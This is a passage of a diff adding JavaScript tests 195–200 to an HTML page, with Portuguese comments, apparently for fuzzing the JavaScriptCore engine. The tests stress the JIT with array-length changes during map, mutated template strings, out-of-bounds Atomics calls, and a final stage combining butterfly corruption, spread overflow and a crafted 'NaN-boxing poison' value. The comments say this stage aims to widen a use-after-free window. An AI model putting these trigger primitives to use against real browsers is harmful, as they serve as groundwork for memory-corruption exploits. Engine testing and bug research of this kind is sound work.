+    const promises=[];
+    for(let i=0;i<100;i++){
+      const p=Promise.resolve().then(function(){
+        const ref=wr.deref();
+        if(ref) return ref.important[0];
+        return null;
+      });
+      promises.push(p);
+    }
+    weakTarget=null; // deixar ser coletado
+    let trash2=new Array(200000).fill(null).map(function(){ return {}; });
+    trash2=null;
+    Promise.all(promises).catch(function(){});
+  } catch(e){}
+  log('Teste 195: fim');
+}
+
+// T196 — JSC: Function.prototype.toString em funcoes JIT com codigo modificado
+// toString deve retornar o codigo fonte original; para funcoes JIT-compiled,
+// JSC guarda o source range; se o source foi modificado (eval, Function()), pode haver bug
+function t196(){
+  log('Teste 196: inicio');
+  try {
+    // Funcao criada via eval — source pode ser modificado
+    const fnFromEval=eval('(function evalFn(x){ return x*2; })');
+    for(let i=0;i<0x20000;i++) fnFromEval(i);
+    try { fnFromEval.toString(); } catch(e){}
+    // Funcao criada via new Function
+    const fnFromNew=new Function('x','y','return x+y;');
+    for(let i=0;i<0x20000;i++) fnFromNew(i,i+1);
+    try { fnFromNew.toString(); } catch(e){}
+    // Proxy de funcao — toString no Proxy
+    const origFn=function hello(){ return 42; };
+    for(let i=0;i<0x20000;i++) origFn();
+    const proxyFn=new Proxy(origFn,{
+      apply:function(t,th,args){ return t.apply(th,args); },
+      get:function(t,k){
+        if(k==='toString') return function(){ return 'FAKE SOURCE'; };
+        return Reflect.get(t,k);
+      }
+    });
+    try { proxyFn.toString(); }      catch(e){}
+    try { Function.prototype.toString.call(proxyFn); } catch(e){}
+    // toString de funcao nativa
+    try { Function.prototype.toString.call(Math.sin); }    catch(e){}
+    try { Function.prototype.toString.call(Array.isArray); } catch(e){}
+    // toString de objeto nao-funcao passado via call
+    try { Function.prototype.toString.call({}); }     catch(e){}
+    try { Function.prototype.toString.call(42); }     catch(e){}
+    try { Function.prototype.toString.call(null); }   catch(e){}
+  } catch(e){}
+  log('Teste 196: fim');
+}
+
+// T197 — DFG: Array.prototype.map com funcao que muda length durante execucao
+// map alloca o array resultado com o length original;
+// se a funcao callback muda o length do array fonte, o resultado pode ser inconsistente
+function t197(){
+  log('Teste 197: inicio');
+  try {
+    function doMap(arr,fn){ return arr.map(fn); }
+    // Warmup com map simples
+    const arr=new Array(100).fill(0).map(function(_,i){ return i*1.1; });
+    for(let i=0;i<0x20000;i++) doMap(arr,function(v){ return v*2; });
+    // Callback que muda o length durante o map
+    let mapCalls=0;
+    const src=[1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9,10.1];
+    function changeLen(v,i,arr2){
+      mapCalls++;
+      if(mapCalls===5) arr2.length=3;  // encolher durante o map
+      if(mapCalls===8) arr2.length=20; // expandir com holes
+      return v*2;
+    }
+    try { src.map(changeLen); } catch(e){}
+    // map com callback que insere elementos no array fonte
+    const src2=[1.1,2.2,3.3];
+    try {
+      src2.map(function(v,i,a){
+        if(i===1) a.push(4.4,5.5); // adicionar elementos
+        return v;
+      });
+    } catch(e){}
+    // map com callback que lanca em posicao especifica
+    try {
+      [1.1,2.2,3.3,4.4,5.5].map(function(v,i){
+        if(i===3) throw new RangeError('map_throws_at_3');
+        return v*2;
+      });
+    } catch(e){}
+    // flatMap com callback que retorna array com ciclo
+    const cycleResult=[1.1];
+    cycleResult.push(cycleResult); // ciclo
+    try {
+      [1,2,3].flatMap(function(v){
+        return v===2?cycleResult:[v*1.1];
+      });
+    } catch(e){}
+  } catch(e){}
+  log('Teste 197: fim');
+}
+
+// T198 — JSC: Tagged template com tag que modifica o array de strings
+// Tagged template: tag(strings,...values); strings e o array de string literals;
+// strings.raw e outro array; modificar strings durante a chamada da tag
+function t198(){
+  log('Teste 198: inicio');
+  try {
+    // Tag normal — JIT compila
+    function tag(strings,...values){
+      return strings.reduce(function(acc,s,i){ return acc+s+(values[i]||''); },'');
+    }
+    for(let i=0;i<0x20000;i++) tag`hello ${i} world ${i+1} end`;
+    // Tag que modifica strings durante a execucao
+    function evilTag(strings,...values){
+      strings[0]='MODIFIED'; // modificar array de strings (deve ser frozen em spec)
+      strings.raw[0]='RAW_MODIFIED';
+      strings.length=0; // zerar length
+      return values.reduce(function(a,v){ return a+v; },0);
+    }
+    for(let i=0;i<500;i++){
+      try { evilTag`hello ${i} world ${i*2} end`; } catch(e){}
+    }
+    // Tag que lanca apos acessar os valores
+    let tagCount=0;
+    function throwingTag(strings,...values){
+      tagCount++;
+      if(tagCount===5) throw new RangeError('tag_throws');
+      return values[0];
+    }
+    for(let i=0;i<100;i++){
+      try { throwingTag`val ${i} end`; } catch(e){}
+    }
+    // Template com expressoes de tipo variavel
+    let typeFlip=0;
+    function multiTypeTag(strings,...values){
+      return values.map(function(v){ return typeof v; }).join(',');
+    }
+    for(let i=0;i<500;i++){
+      const v1=i%3===0?Symbol('s'):i%3===1?{x:i}:i*1.1;
+      try { multiTypeTag`a ${v1} b ${null} c ${undefined}`; } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 198: fim');
+}
+
+// T199 — JSC: Atomics.wait / Atomics.notify em thread principal
+// Atomics.wait no thread principal deve retornar "not-equal" ou lancar;
+// em implementacoes bugadas pode bloquear ou causar comportamento indefinido
+function t199(){
+  log('Teste 199: inicio');
+  try {
+    const sab=new SharedArrayBuffer(64);
+    const i32=new Int32Array(sab);
+    // Atomics.wait no thread principal: deve retornar "not-equal" ou lancar TypeError
+    try {
+      const r=Atomics.wait(i32,0,0,0); // timeout=0 — retorno imediato esperado
+      // r deve ser "not-equal" ou "timed-out"
+    } catch(e){}
+    // Atomics.waitAsync no thread principal (nao-bloqueante)
+    try {
+      const r=Atomics.waitAsync(i32,0,0,100);
+      if(r&&r.value&&typeof r.value.then==='function'){
+        r.value.then(function(){}).catch(function(){});
+      }
+    } catch(e){}
+    // Atomics.notify com contagem grande
+    try { Atomics.notify(i32,0,0x7FFFFFFF); } catch(e){}
+    // Operacoes atomicas com valores que overflowam o tipo
+    const overflowVals=[0x7FFFFFFF,0x80000000|0,-1,0xFFFFFFFF|0];
+    for(let v of overflowVals){
+      try { Atomics.store(i32,0,v); }      catch(e){}
+      try { Atomics.add(i32,0,v); }        catch(e){}
+      try { Atomics.sub(i32,0,v); }        catch(e){}
+      try { Atomics.and(i32,0,v); }        catch(e){}
+      try { Atomics.or(i32,0,v); }         catch(e){}
+      try { Atomics.xor(i32,0,v); }        catch(e){}
+      try { Atomics.exchange(i32,0,v); }   catch(e){}
+      try { Atomics.compareExchange(i32,0,v,0); } catch(e){}
+    }
+    // Acesso OOB em Atomics
+    for(let idx of [-1,16,0x7FFFFFFF]){
+      try { Atomics.load(i32,idx); }       catch(e){}
+      try { Atomics.store(i32,idx,1); }    catch(e){}
+    }
+  } catch(e){}
+  log('Teste 199: fim');
+}
+
+// T200 — Stress final: butterfly corruption + spread overflow + NaN-boxing combinados
+// Combinar os tres vetores mais diretos desta rodada em sequencia rapida
+// com GC entre cada fase para maximizar a janela de UAF
+function t200(){
+  log('Teste 200: inicio');
+  try {
+    'use strict';
+    // Fase A: butterfly COW corruption
+    const cows=new Array(500).fill(null).map(function(){ return [1.1,2.2,3.3,4.4,5.5]; });
+    function readCow(a){ return a[0]+a[1]+a[4]; }
+    for(let i=0;i<0x30000;i++) readCow(cows[i%500]);
+    for(let i=0;i<250;i++) cows[i][0]=i*0.01; // unshare metade
+    let trash=new Array(50000).fill(null).map(function(){ return [1.1,2.2,3.3]; });
+    trash=null;
+    for(let i=0;i<500;i++){
+      try { readCow(cows[i%500]); } catch(e){}
+    }
+
+    // Fase B: spread overflow combinado
+    function jitSpread(a){ return [...a]; }
+    for(let i=0;i<400;i++) jitSpread([1.1,2.2,3.3]);
+    for(let sz of [0x20001,0x3FFFF,0x7FFFF]){
+      try {
+        const big=new Array(sz).fill(1.1);
+        jitSpread(big);
+      } catch(e){}
+    }
+
+    // Fase C: NaN-boxing poison
+    const sharedBuf2=new ArrayBuffer(8);
+    const f64=new Float64Array(sharedBuf2);
+    const u32=new Uint32Array(sharedBuf2);
+    u32[1]=0xFFFF0001; u32[0]=0x00000010; // parece ponteiro JSC
+    const poison=f64[0];
+    const fa=new Float64Array(64);
+    fa.fill(poison);
+    function usePoison(a,i){ let v=a[i]; return v|0; }
+    for(let i=0;i<0x20000;i++) usePoison(fa,i%64);
+
+    // GC final
+    trash=new Array(300000).fill(null).map(function(){ return {x:new Uint8Array(4)}; });
+    trash=null;
+
+    // Pos-GC: tentar reler todos
+    for(let i=0;i<200;i++){
+      try { readCow(cows[i%500]); }  catch(e){}
+      try { usePoison(fa,i%64); }    catch(e){}
+    }
+  } catch(e){}
+  log('Teste 200: fim');
+}
+</script>
+</body>
+</html>
